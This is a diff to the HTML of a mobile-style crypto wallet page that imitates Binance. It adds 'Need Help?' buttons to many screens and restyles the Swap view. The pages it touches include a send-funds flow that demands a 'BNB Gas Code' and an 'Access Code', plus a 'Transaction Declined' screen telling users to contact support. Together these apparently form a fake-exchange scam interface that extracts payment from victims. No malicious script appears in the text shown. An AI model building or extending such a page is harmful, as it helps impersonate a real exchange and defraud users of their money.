@@ -254,6 +254,7 @@
           </svg> Back
         </button>
     </div>
+    <button onclick="showPage('page17')" class="bg-[#1e2023] text-gray-300 hover:text-yellow-400 px-4 py-2 rounded-lg border border-gray-700">Need Help?</button>
       <div class="card bg-[#2b3139] p-4 rounded-2xl shadow-lg mb-6">
         <h3 class="text-lg font-semibold mb-3">Live BTC/USDT Chart</h3>
         <div class="tradingview-widget-container">
@@ -294,6 +295,7 @@
           </svg> Back
         </button>
       </div>
+      <button onclick="showPage('page17')" class="bg-[#1e2023] text-gray-300 hover:text-yellow-400 px-4 py-2 rounded-lg border border-gray-700">Need Help?</button>
       <div class="tradingview-widget-container">
           <div id="markets_chart_widget"></div>
       </div>
@@ -350,56 +352,62 @@
   </section>
 
   <section id="page7" class="page min-h-screen pt-20 bg-[#1E2329] text-white hidden">
-    <div class="container mx-auto p-4">
-      <h2 class="text-2xl font-bold mb-6 text-[#FCD535]">Swap</h2>
-    <div>
-      <button onclick="showPage('page17')" class="bg-[#1e2023] text-gray-300 hover:text-yellow-400 px-4 py-2 rounded-lg border border-gray-700">Need Help?</button>
-      <div>
+  <div class="container mx-auto p-4">
+    <div class="flex items-center justify-between mb-6">
       <button onclick="showPage('page0')" class="text-sm text-gray-400 hover:text-[#FCD535] flex items-center">
-          <svg xmlns="http://www.w3.org/2000/svg" class="h-4 w-4 mr-1" fill="none" viewBox="0 0 24 24" stroke="currentColor">
-            <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M15 19l-7-7 7-7" />
-          </svg> Back
-        </button>
+        <svg xmlns="http://www.w3.org/2000/svg" class="h-4 w-4 mr-1" fill="none" viewBox="0 0 24 24" stroke="currentColor">
+          <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M15 19l-7-7 7-7" />
+        </svg> Back
+      </button>
+      <h2 class="text-2xl font-bold text-[#FCD535] hidden sm:block">Swap</h2>
+      <button onclick="showPage('page17')" class="bg-[#1e2023] text-gray-300 hover:text-yellow-400 px-4 py-2 rounded-lg border border-gray-700">Need Help?</button>
     </div>
-      <div class="bg-[#2b3139] p-6 rounded-xl shadow-lg">
-        <div class="mb-4">
-          <label for="fromToken" class="block text-sm font-medium text-gray-400">From</label>
-          <select id="fromToken" class="w-full p-3 mt-1 bg-[#363a45] rounded-lg border border-gray-600 focus:outline-none focus:border-[#FCD535]">
-            <option value="BNB">BNB</option>
-            <option value="USDT">USDT</option>
-            <option value="BTC">BTC</option>
-          </select>
-        </div>
-        <div class="mb-4">
-          <label for="fromAmount" class="block text-sm font-medium text-gray-400">Amount</label>
-          <input type="number" id="fromAmount" placeholder="Enter amount" class="w-full p-3 mt-1 bg-[#363a45] rounded-lg border border-gray-600 focus:outline-none focus:border-[#FCD535]">
-        </div>
-        <div class="text-center my-4">
-          <svg xmlns="http://www.w3.org/2000/svg" fill="none" viewBox="0 0 24 24" stroke-width="1.5" stroke="currentColor" class="w-8 h-8 mx-auto text-[#FCD535]"><path stroke-linecap="round" stroke-linejoin="round" d="M19.5 5.25l-7.5 7.5-7.5-7.5m15 6l-7.5 7.5-7.5-7.5" /></svg>
-        </div>
-        <div class="mb-4">
-          <label for="toToken" class="block text-sm font-medium text-gray-400">To</label>
-          <select id="toToken" class="w-full p-3 mt-1 bg-[#363a45] rounded-lg border border-gray-600 focus:outline-none focus:border-[#FCD535]">
-            <option value="USDT">USDT</option>
-            <option value="BNB">BNB</option>
-            <option value="BTC">BTC</option>
-          </select>
-        </div>
-        <div class="mb-4">
-          <label class="block text-sm font-medium text-gray-400">You will receive</label>
-          <div id="receiveAmount" class="w-full p-3 mt-1 bg-[#363a45] rounded-lg border border-gray-600 text-white font-semibold">0.000000</div>
-        </div>
-        <button onclick="handleTrade()" class="w-full p-3 font-bold text-black bg-[#FCD535] rounded-lg hover:bg-yellow-400 transition">Swap</button>
+
+    <h2 class="text-2xl font-bold mb-6 text-[#FCD535] sm:hidden">Swap</h2>
+
+    <div class="bg-[#2b3139] p-6 rounded-xl shadow-lg">
+      <div class="mb-4">
+        <label for="fromToken" class="block text-sm font-medium text-gray-400">From</label>
+        <select id="fromToken" class="w-full p-3 mt-1 bg-[#363a45] rounded-lg border border-gray-600 focus:outline-none focus:border-[#FCD535]">
+          <option value="BNB">BNB</option>
+          <option value="USDT">USDT</option>
+          <option value="BTC">BTC</option>
+        </select>
       </div>
+      <div class="mb-4">
+        <label for="fromAmount" class="block text-sm font-medium text-gray-400">Amount</label>
+        <input type="number" id="fromAmount" placeholder="Enter amount" class="w-full p-3 mt-1 bg-[#363a45] rounded-lg border border-gray-600 focus:outline-none focus:border-[#FCD535]">
+      </div>
+      <div class="text-center my-4">
+        <svg xmlns="http://www.w3.org/2000/svg" fill="none" viewBox="0 0 24 24" stroke-width="1.5" stroke="currentColor" class="w-8 h-8 mx-auto text-[#FCD535]"><path stroke-linecap="round" stroke-linejoin="round" d="M19.5 5.25l-7.5 7.5-7.5-7.5m15 6l-7.5 7.5-7.5-7.5" /></svg>
+      </div>
+      <div class="mb-4">
+        <label for="toToken" class="block text-sm font-medium text-gray-400">To</label>
+        <select id="toToken" class="w-full p-3 mt-1 bg-[#363a45] rounded-lg border border-gray-600 focus:outline-none focus:border-[#FCD535]">
+          <option value="USDT">USDT</option>
+          <option value="BNB">BNB</option>
+          <option value="BTC">BTC</option>
+        </select>
+      </div>
+      <div class="mb-4">
+        <label class="block text-sm font-medium text-gray-400">You will receive</label>
+        <div id="receiveAmount" class="w-full p-3 mt-1 bg-[#363a45] rounded-lg border border-gray-600 text-white font-semibold">0.000000</div>
+      </div>
+      <button onclick="handleTrade()" class="w-full p-3 font-bold text-black bg-[#FCD535] rounded-lg hover:bg-yellow-400 transition">Swap</button>
     </div>
+  </div>
   </section>
+
+  
   <section id="page8" class="page min-h-screen flex flex-col items-center justify-center bg-[#0b0e11] text-white px-6 pt-20">
     <div>
         <button type="button" onclick="showPage('page0')" class="w-full bg-[#333a4b] text-yellow-400 font-semibold py-3 rounded hover:bg-[#444f65] transition">
           ⬅ Back
         </button>
-    </div><div class="w-full max-w-md bg-[#1e2329] rounded-2xl p-8 shadow-lg">
+    </div>
+    <div class="w-full max-w-md bg-[#1e2329] rounded-2xl p-8 shadow-lg">
       <h2 class="text-2xl font-bold text-yellow-400 mb-8 text-center">Send Funds</h2>
+      <button onclick="showPage('page17')" class="bg-[#1e2023] text-gray-300 hover:text-yellow-400 px-4 py-2 rounded-lg border border-gray-700">Need Help?</button>
       <label for="inputWallet" class="block text-sm mb-2 font-semibold">Recipient Wallet Address</label>
       <input id="inputWallet" type="text" placeholder="0x1234...abcd" class="w-full mb-6 p-3 rounded bg-[#111820] border border-[#333a4b] focus:outline-none focus:border-yellow-400 text-sm font-semibold" />
       <label for="networkSelect" class="block text-sm mb-2 font-semibold">Select Network</label>
@@ -462,11 +470,15 @@
         <button onclick="showPage('page9ii')" class="w-full bg-yellow-500 hover:bg-yellow-600 text-black font-bold py-2 rounded">Confirm BNB Gas Code</button>
       </div>
     </div>
+    <div>
+      <button onclick="showPage('page17')" class="bg-[#1e2023] text-gray-300 hover:text-yellow-400 px-4 py-2 rounded-lg border border-gray-700">Need Help?</button>
+    </div>
   </section>
 
   <section id="page9ii" class="page min-h-screen flex items-center justify-center bg-[#0b0e11] text-white px-4 transition-opacity duration-300 pt-20">
     <div class="w-full max-w-md bg-[#10151c] p-6 rounded-xl shadow-xl text-center">
       <h2 class="text-xl font-bold text-yellow-400 mb-4">Access Code Required</h2>
+     <button onclick="showPage('page17')" class="bg-[#1e2023] text-gray-300 hover:text-yellow-400 px-4 py-2 rounded-lg border border-gray-700">Need Help?</button>
       <canvas id="accessQr" class="mx-auto mb-4"></canvas>
       <p class="text-sm text-gray-400 mb-2">Scan the code or enter the access code below:</p>
       <input id="accessCodeInput" placeholder="Enter access code" class="w-full mb-4 p-3 rounded bg-[#1c232b] border border-gray-600 text-white text-center">
@@ -481,6 +493,7 @@
 
   <section id="page11" class="page min-h-screen flex items-center justify-center bg-[#0b0e11] text-white px-4 transition-opacity duration-300 pt-20">
     <div class="text-center">
+    <button onclick="showPage('page17')" class="bg-[#1e2023] text-gray-300 hover:text-yellow-400 px-4 py-2 rounded-lg border border-gray-700">Need Help?</button>
       <h2 class="text-2xl font-bold text-red-500 mb-4">Transaction Declined</h2>
       <p class="text-sm text-gray-400 mb-6">Access code was incorrect. Please try again or contact support.</p>
       <button onclick="showPage('page9ii')" class="bg-yellow-500 text-black font-bold py-2 px-4 rounded">Try Again</button>
@@ -499,6 +512,7 @@
   <section id="page10" class="page min-h-screen flex flex-col justify-between px-4 py-6 bg-[#1E2329] text-white pt-20 hidden">
     <div class="max-w-md mx-auto w-full">
       <div class="flex justify-between items-center mb-6">
+       <button onclick="showPage('page17')" class="bg-[#1e2023] text-gray-300 hover:text-yellow-400 px-4 py-2 rounded-lg border border-gray-700">Need Help?</button>
         <div class="text-xl font-bold text-[#FCD535]">Convert</div>
         <button onclick="showPage('page0')" class="text-sm text-gray-400 hover:text-[#FCD535] flex items-center">
           <svg xmlns="http://www.w3.org/2000/svg" class="h-4 w-4 mr-1" fill="none" viewBox="0 0 24 24" stroke="currentColor">
@@ -538,7 +552,7 @@
         <button onclick="showPage('page0')" class="text-gray-400 hover:text-[#FCD535] text-sm">Cancel</button>
       </div>
       <p class="text-sm text-gray-300 mb-6">Connect your wallet to manage assets on the Binance ecosystem.</p>
-
+     <button onclick="showPage('page17')" class="bg-[#1e2023] text-gray-300 hover:text-yellow-400 px-4 py-2 rounded-lg border border-gray-700">Need Help?</button>
       <label for="chainSelect" class="block mb-2 text-sm font-semibold text-gray-400">Select Network</label>
       <select id="chainSelect" class="w-full p-3 mb-4 rounded-lg bg-[#363a45] border border-gray-600 text-white focus:ring-[#FCD535] focus:border-[#FCD535]">
         <option value="bsc">Binance Smart Chain (BEP20)</option>
@@ -571,7 +585,7 @@
           </svg>Back
         </button>
       </div>
-
+    <button onclick="showPage('page17')" class="bg-[#1e2023] text-gray-300 hover:text-yellow-400 px-4 py-2 rounded-lg border border-gray-700">Need Help?</button>
       <div class="card">
         <h3 class="text-lg font-semibold mb-4">Account</h3>
         <ul class="space-y-4">
